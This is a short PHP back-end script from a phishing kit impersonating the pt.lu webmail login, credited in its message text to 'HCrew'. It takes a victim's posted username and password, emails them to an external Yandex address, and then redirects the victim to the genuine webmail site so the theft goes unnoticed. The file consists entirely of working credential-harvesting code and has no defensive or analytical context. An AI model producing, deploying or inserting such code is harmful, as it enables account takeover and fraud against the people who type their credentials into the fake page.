<?
$mailfrom = "pt.lu <info@jobwebhost.net>";
$ip = getenv("REMOTE_ADDR");
$message .= "---------------Created By HCrew-----------------\n";
$message .= " \n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= " \n";
$message .= "---------------Created By HCrew-----------------\n";

$recipient = "princedclogin@yandex.com";
$subject = "pt.lu";
$headers = "From:$mailfrom\n";
$headers .= "MIME-Version: 1.0\n";
	mail("", "Century ReZulT (Hcrew)", $message);
	if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://webmail.pt.lu/");
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
?>